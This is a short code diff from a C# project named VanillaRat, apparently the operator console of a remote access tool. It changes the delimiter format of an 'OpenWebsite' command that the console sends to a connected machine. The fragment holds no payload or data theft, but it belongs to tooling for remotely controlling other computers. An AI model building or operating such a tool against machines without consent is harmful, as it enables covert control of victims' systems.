@@ -21,7 +21,7 @@ namespace VanillaRat.Forms
         //Open website
         private void btnOpen_Click(object sender, EventArgs e)
         {
-            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("OpenWebsite(" + txtLink.Text + ")"));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("OpenWebsite<{" + txtLink.Text + "}>"));
             Close();
         }
 
